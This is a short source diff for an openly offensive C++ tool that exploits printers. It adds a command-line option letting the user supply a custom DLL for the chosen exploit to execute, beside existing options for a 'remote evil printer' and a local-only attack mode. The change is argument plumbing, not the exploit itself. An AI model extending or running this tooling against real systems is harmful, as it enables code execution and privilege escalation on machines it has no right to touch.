@@ -82,7 +82,7 @@ namespace
 		return return_value;
 	}
 
-	bool parseCLI(int p_argc, const char* p_argv[], std::string& p_shared_printer, std::shared_ptr<Exploit>& p_exploit_ptr)
+	bool parseCLI(int p_argc, const char* p_argv[], std::string& p_shared_printer, std::shared_ptr<Exploit>& p_exploit_ptr, std::string& p_dll)
 	{
 		popl::OptionParser op("CLI options");
 		auto help = op.add<popl::Switch>("h", "help", "Display the help message");
@@ -90,6 +90,7 @@ namespace
 		auto evil_printer = op.add<popl::Value<std::string>>("n", "name", "The remote evil printer name");
 		auto exploit = op.add<popl::Value<std::string>>("e", "exploit", "The exploit to use");
 		auto local_only = op.add<popl::Switch>("l", "local", "No remote printer. Local attack only.");
+		auto custom_dll = op.add<popl::Value<std::string>>("d", "dll", "Path to user provided DLL to execute.");
 		op.parse(p_argc, p_argv);
 
 		if (p_argc < 3 || help->is_set())
@@ -119,6 +120,12 @@ namespace
 			}
 
 			p_exploit_ptr = s_exploits.createExploit(exploit->value(0));
+		}
+
+		if (custom_dll->is_set())
+		{
+			// user provided dll
+			p_exploit_ptr->set_dll(custom_dll->value(0));
 		}
 
 		if (local_only->is_set())
@@ -172,8 +179,9 @@ int main(int p_argc, const char* p_argv[])
 	std::cout << std::endl;
 
 	std::string shared_printer;
+	std::string user_dll;
 	std::shared_ptr<Exploit> exploit_ptr;
-	if (!parseCLI(p_argc, p_argv, shared_printer, exploit_ptr))
+	if (!parseCLI(p_argc, p_argv, shared_printer, exploit_ptr, user_dll))
 	{
 		return EXIT_FAILURE;
 	}
